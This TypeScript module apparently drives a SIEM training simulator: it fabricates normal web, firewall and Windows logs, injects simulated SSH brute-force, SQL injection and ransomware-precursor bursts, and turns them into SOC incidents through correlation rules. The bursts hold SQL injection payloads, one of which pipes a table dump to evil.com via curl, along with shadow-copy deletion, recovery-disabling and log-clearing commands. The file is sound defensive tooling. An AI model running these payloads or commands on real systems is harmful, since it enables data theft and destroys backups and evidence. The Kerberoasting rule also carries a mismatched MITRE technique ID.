import { LogEvent, Incident, AttackScenario } from '../types/siem';
import { ATTACK_SCENARIOS } from '../data/scenarios';

// Normal log generator templates
const NORMAL_HOSTS = ['srv-web-prod01', 'dc01.corp.internal', 'fw-core-01', 'ws-fin-04', 'ws-dev-12', 'proxy-edge-01'];
const NORMAL_USERS = ['jsmith', 'mchen', 'daud', 'system', 'svc_backup', 'jdoe'];
const NORMAL_URLS = ['/index.html', '/api/v1/auth/session', '/static/bundle.js', '/api/v1/user/settings', '/health', '/api/v1/reports'];

export function generateRandomNormalEvent(): LogEvent {
  const randType = Math.random();
  const now = new Date().toISOString();
  const host = NORMAL_HOSTS[Math.floor(Math.random() * NORMAL_HOSTS.length)];
  const user = NORMAL_USERS[Math.floor(Math.random() * NORMAL_USERS.length)];

  if (randType < 0.4) {
    // Web Access Log
    const url = NORMAL_URLS[Math.floor(Math.random() * NORMAL_URLS.length)];
    const clientIp = `192.168.1.${Math.floor(Math.random() * 200) + 10}`;
    return {
      id: `ev-norm-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      _time: now,
      _raw: `${clientIp} - ${user} [${new Date().toUTCString()}] "GET ${url} HTTP/1.1" 200 ${Math.floor(Math.random() * 4000) + 400} "https://app.corp.internal" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
      index: 'web',
      sourcetype: 'access_combined',
      host,
      source: '/var/log/nginx/access.log',
      src_ip: clientIp,
      dest_ip: '10.240.0.50',
      dest_port: 443,
      user,
      action: 'allowed',
      status: 200,
      uri_path: url,
      severity: 'informational'
    };
  } else if (randType < 0.7) {
    // Palo Alto Firewall Log
    const srcIp = `10.240.${Math.floor(Math.random() * 20)}.${Math.floor(Math.random() * 250) + 1}`;
    const destPort = [80, 443, 53, 8080][Math.floor(Math.random() * 4)];
    const bytes = Math.floor(Math.random() * 2500) + 100;
    return {
      id: `ev-norm-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      _time: now,
      _raw: `Oct 23 18:22:10 fw-core-01 1,2026/10/23 18:22:10,001801000412,TRAFFIC,allow,0,2026/10/23 18:22:10,${srcIp},142.250.190.46,0.0.0.0,0.0.0.0,Rule-General-Out,corp\\${user},ssl,vsys1,trust,untrust,ethernet1/1,ethernet1/2,LogForwarding,${Math.floor(Math.random() * 10000)},1,${Math.floor(Math.random() * 40000) + 1024},${destPort},0,0,0x0,tcp,allow,${bytes},${bytes * 2},0,1`,
      index: 'firewall',
      sourcetype: 'pan:traffic',
      host: 'fw-core-01',
      source: 'paloalto:pan_traffic',
      src_ip: srcIp,
      dest_ip: '142.250.190.46',
      src_port: Math.floor(Math.random() * 40000) + 1024,
      dest_port: destPort,
      protocol: 'TCP',
      action: 'allowed',
      bytes_in: bytes,
      bytes_out: bytes * 2,
      severity: 'informational'
    };
  } else {
    // Windows Event 4624 / Sysmon 1
    const isSysmon = Math.random() > 0.5;
    if (isSysmon) {
      const proc = ['svchost.exe', 'explorer.exe', 'backgroundTaskHost.exe', 'RuntimeBroker.exe'][Math.floor(Math.random() * 4)];
      return {
        id: `ev-norm-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        _time: now,
        _raw: `EventCode=1 Provider_Name="Microsoft-Windows-Sysmon" ComputerName=${host} Image="C:\\Windows\\System32\\${proc}" CommandLine="${proc} -k LocalService" ParentImage="C:\\Windows\\System32\\services.exe" User="NT AUTHORITY\\SYSTEM"`,
        index: 'endpoint',
        sourcetype: 'WinEventLog:Sysmon',
        host,
        source: 'WinEventLog:Sysmon',
        user: 'SYSTEM',
        event_id: 1,
        process_name: proc,
        command_line: `${proc} -k LocalService`,
        parent_process: 'services.exe',
        action: 'success',
        severity: 'informational'
      };
    } else {
      return {
        id: `ev-norm-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        _time: now,
        _raw: `EventCode=4624 EventType=4 ComputerName=${host} Type=Information Message="An account was successfully logged on. Target Account: Account Name: ${user} Logon Type: 3 (Network) Source Network Address: 10.240.1.10"`,
        index: 'endpoint',
        sourcetype: 'WinEventLog:Security',
        host,
        source: 'WinEventLog:Security',
        user,
        event_id: 4624,
        action: 'success',
        severity: 'informational'
      };
    }
  }
}

// Generate an attack burst for a given scenario
export function generateAttackBurst(scenarioId: string): LogEvent[] {
  const scenario = ATTACK_SCENARIOS.find(s => s.id === scenarioId);
  if (!scenario) return [];

  const now = Date.now();
  const events: LogEvent[] = [];

  if (scenarioId === 'ssh_brute_force') {
    const candidateUsers = ['root', 'admin', 'test', 'oracle', 'guest', 'jsmith'];
    candidateUsers.forEach((u, idx) => {
      const isLast = idx === candidateUsers.length - 1;
      const eventTime = new Date(now - (candidateUsers.length - idx) * 3000).toISOString();
      events.push({
        id: `ev-burst-ssh-${now}-${idx}`,
        _time: eventTime,
        _raw: `Oct 23 18:30:${String(idx * 3).padStart(2, '0')} vpn-gw-01 sshd[${20000 + idx}]: ${
          isLast
            ? `Accepted password for ${u} from ${scenario.attackerProfile.ip} port ${39000 + idx} ssh2`
            : `Failed password for invalid user ${u} from ${scenario.attackerProfile.ip} port ${39000 + idx} ssh2`
        }`,
        index: 'security',
        sourcetype: 'linux_secure',
        host: 'vpn-gw-01',
        source: '/var/log/auth.log',
        src_ip: scenario.attackerProfile.ip,
        dest_ip: '10.240.0.1',
        src_port: 39000 + idx,
        dest_port: 22,
        user: u,
        action: isLast ? 'success' : 'failure',
        signature: isLast ? 'SSH Brute Force: Password Guessing Succeeded' : 'SSH Authentication Failed',
        mitre_tactic: scenario.mitreTactic,
        mitre_technique_id: scenario.mitreTechniqueId,
        mitre_technique_name: scenario.mitreTechniqueName,
        severity: isLast ? 'critical' : 'high',
        is_attack: true,
        attack_scenario_id: scenarioId
      });
    });
  } else if (scenarioId === 'web_sqli_dump') {
    const payloads = [
      'id=1%27%20OR%20%271%27=%271',
      'id=1%20UNION%20SELECT%20null,table_name%20FROM%20information_schema.tables--',
      'id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users--',
      'id=1;%20COPY%20users%20TO%20PROGRAM%20%27curl%20http://evil.com/dump%27'
    ];
    payloads.forEach((p, idx) => {
      const eventTime = new Date(now - (payloads.length - idx) * 4000).toISOString();
      events.push({
        id: `ev-burst-sqli-${now}-${idx}`,
        _time: eventTime,
        _raw: `${scenario.attackerProfile.ip} - - [${new Date().toUTCString()}] "GET /api/v1/catalog?${p} HTTP/1.1" 500 1280 "https://app.corp.internal" "${scenario.attackerProfile.tool}"`,
        index: 'web',
        sourcetype: 'access_combined',
        host: 'srv-web-prod01',
        source: '/var/log/nginx/access.log',
        src_ip: scenario.attackerProfile.ip,
        dest_ip: '10.240.0.50',
        dest_port: 443,
        user: 'anonymous',
        action: 'alert',
        status: 500,
        uri_path: '/api/v1/catalog',
        uri_query: decodeURIComponent(p),
        user_agent: scenario.attackerProfile.tool,
        signature: 'SQL Injection: Database schema enumeration and table dump',
        mitre_tactic: scenario.mitreTactic,
        mitre_technique_id: scenario.mitreTechniqueId,
        mitre_technique_name: scenario.mitreTechniqueName,
        severity: 'critical',
        is_attack: true,
        attack_scenario_id: scenarioId
      });
    });
  } else if (scenarioId === 'ransomware_precursor') {
    const cmds = [
      'vssadmin.exe delete shadows /all /quiet',
      'bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures',
      'bcdedit.exe /set {default} recoveryenabled no',
      'wevtutil.exe cl Security'
    ];
    cmds.forEach((cmd, idx) => {
      const isWevt = cmd.includes('wevtutil');
      const eventTime = new Date(now - (cmds.length - idx) * 2000).toISOString();
      events.push({
        id: `ev-burst-rans-${now}-${idx}`,
        _time: eventTime,
        _raw: isWevt
          ? `EventCode=1102 EventType=4 ComputerName=filesrv-01 Type=Audit Success Message="The audit log was cleared. Subject Account Name: SYSTEM"`
          : `EventCode=1 Provider_Name="Microsoft-Windows-Sysmon" ComputerName=filesrv-01 Image="C:\\Windows\\System32\\${cmd.split(' ')[0]}" CommandLine="${cmd}" User="NT AUTHORITY\\SYSTEM"`,
        index: isWevt ? 'security' : 'endpoint',
        sourcetype: isWevt ? 'WinEventLog:Security' : 'WinEventLog:Sysmon',
        host: 'filesrv-01',
        source: isWevt ? 'WinEventLog:Security' : 'WinEventLog:Sysmon',
        user: 'SYSTEM',
        event_id: isWevt ? 1102 : 1,
        process_name: cmd.split(' ')[0],
        command_line: cmd,
        action: 'alert',
        signature: isWevt
          ? 'Security Event Log Cleared (Event ID 1102 - Forensic Evidence Destruction)'
          : 'Ransomware Indicator: Shadow copy deletion & recovery inhibition',
        mitre_tactic: scenario.mitreTactic,
        mitre_technique_id: scenario.mitreTechniqueId,
        mitre_technique_name: scenario.mitreTechniqueName,
        severity: 'critical',
        is_attack: true,
        attack_scenario_id: scenarioId
      });
    });
  } else {
    // Default single scenario injection
    events.push({
      id: `ev-burst-${scenarioId}-${now}`,
      _time: new Date().toISOString(),
      _raw: `CRITICAL ALERT: Detected ${scenario.name} originating from ${scenario.attackerProfile.ip} targeting ${scenario.targetProfile.host} [Tool: ${scenario.attackerProfile.tool}]`,
      index: 'security',
      sourcetype: 'suricata',
      host: scenario.targetProfile.host,
      source: 'security_sensor',
      src_ip: scenario.attackerProfile.ip,
      user: scenario.targetProfile.user || 'admin',
      action: 'alert',
      signature: scenario.name,
      mitre_tactic: scenario.mitreTactic,
      mitre_technique_id: scenario.mitreTechniqueId,
      mitre_technique_name: scenario.mitreTechniqueName,
      severity: scenario.severity,
      is_attack: true,
      attack_scenario_id: scenarioId
    });
  }

  return events;
}

// Evaluate correlation rules to generate SOC incidents from log events
export function evaluateCorrelationRules(events: LogEvent[]): Incident[] {
  const incidents: Incident[] = [];

  // Rule 1: SSH Brute Force
  const sshFails = events.filter(e => e.attack_scenario_id === 'ssh_brute_force' || (e.action === 'failure' && e.dest_port === 22));
  if (sshFails.length >= 3) {
    const sample = sshFails[0];
    incidents.push({
      id: 'INC-2026-101',
      title: 'Distributed SSH & VPN Credential Spraying',
      description: 'Multiple authentication failures observed against edge gateway followed by anomalous accepted session.',
      severity: 'critical',
      riskScore: 92,
      status: 'new',
      detectedAt: sample._time,
      ruleName: 'RULE_SEC_01_BRUTE_FORCE_THRESHOLD',
      mitreTactic: 'Credential Access',
      mitreTechniqueId: 'T1110.001',
      mitreTechniqueName: 'Brute Force: Password Guessing',
      affectedHost: sample.host,
      affectedUser: 'jsmith',
      attackerIp: sample.src_ip || '45.142.122.84',
      eventIds: sshFails.map(e => e.id),
      notes: [
        {
          timestamp: new Date().toISOString(),
          author: 'Correlation Engine',
          text: 'Alert auto-generated: High failure velocity (>5 fails/min) from untrusted external IP.'
        }
      ],
      containmentActionsTaken: []
    });
  }

  // Rule 2: SQL Injection
  const sqliLogs = events.filter(e => e.attack_scenario_id === 'web_sqli_dump' || (e.uri_query && /union|select|or 1=1/i.test(e.uri_query)));
  if (sqliLogs.length >= 1) {
    const sample = sqliLogs[0];
    incidents.push({
      id: 'INC-2026-102',
      title: 'Web Application SQL Injection & Database Probing',
      description: 'Public-facing API endpoint received SQL injection patterns attempting to extract table data.',
      severity: 'critical',
      riskScore: 98,
      status: 'investigating',
      detectedAt: sample._time,
      ruleName: 'RULE_WAF_04_SQLI_UNION_EXTRACT',
      mitreTactic: 'Initial Access',
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      affectedHost: sample.host,
      affectedUser: 'www-data',
      attackerIp: sample.src_ip || '185.220.101.5',
      eventIds: sqliLogs.map(e => e.id),
      notes: [
        {
          timestamp: new Date().toISOString(),
          author: 'Correlation Engine',
          text: 'WAF Rule SIG-2018422 matched sqlmap fingerprint and UNION SELECT syntax.'
        }
      ],
      containmentActionsTaken: []
    });
  }

  // Rule 3: Kerberoasting & PsExec
  const kerbLogs = events.filter(e => e.attack_scenario_id === 'ad_kerberoast_lateral' || e.event_id === 7045 || e.event_id === 4769);
  if (kerbLogs.length >= 1) {
    const sample = kerbLogs[0];
    incidents.push({
      id: 'INC-2026-103',
      title: 'Active Directory Kerberoasting & Lateral Movement',
      description: 'Abnormal RC4 Kerberos ticket request detected followed by PsExec remote service execution.',
      severity: 'critical',
      riskScore: 95,
      status: 'new',
      detectedAt: sample._time,
      ruleName: 'RULE_AD_07_KERBEROAST_PSEXEC',
      mitreTactic: 'Lateral Movement',
      mitreTechniqueId: 'T1003.001',
      mitreTechniqueName: 'OS Credential Dumping: LSASS Memory',
      affectedHost: 'dc01.corp.internal',
      affectedUser: 'svc_mssql_admin',
      attackerIp: '10.240.12.18',
      eventIds: kerbLogs.map(e => e.id),
      notes: [
        {
          timestamp: new Date().toISOString(),
          author: 'Correlation Engine',
          text: 'Windows Event ID 7045 PSEXESVC detected on Domain Controller.'
        }
      ],
      containmentActionsTaken: []
    });
  }

  // Rule 4: Ransomware Precursor
  const ransLogs = events.filter(e => e.attack_scenario_id === 'ransomware_precursor' || e.event_id === 1102 || (e.command_line && /vssadmin/i.test(e.command_line)));
  if (ransLogs.length >= 1) {
    const sample = ransLogs[0];
    incidents.push({
      id: 'INC-2026-104',
      title: 'Ransomware Precursor: Volume Shadow Deletion & Log Wipe',
      description: 'Execution of vssadmin delete shadows and Windows audit log wipe (Event 1102).',
      severity: 'critical',
      riskScore: 99,
      status: 'new',
      detectedAt: sample._time,
      ruleName: 'RULE_EP_12_RANSOMWARE_DEFENSE_EVASION',
      mitreTactic: 'Defense Evasion',
      mitreTechniqueId: 'T1490',
      mitreTechniqueName: 'Inhibit System Recovery',
      affectedHost: sample.host,
      affectedUser: 'SYSTEM',
      attackerIp: '10.240.15.99',
      eventIds: ransLogs.map(e => e.id),
      notes: [
        {
          timestamp: new Date().toISOString(),
          author: 'Correlation Engine',
          text: 'Critical endpoint behavior: vssadmin executed with silent delete flag followed by log wipe.'
        }
      ],
      containmentActionsTaken: []
    });
  }

  return incidents;
}
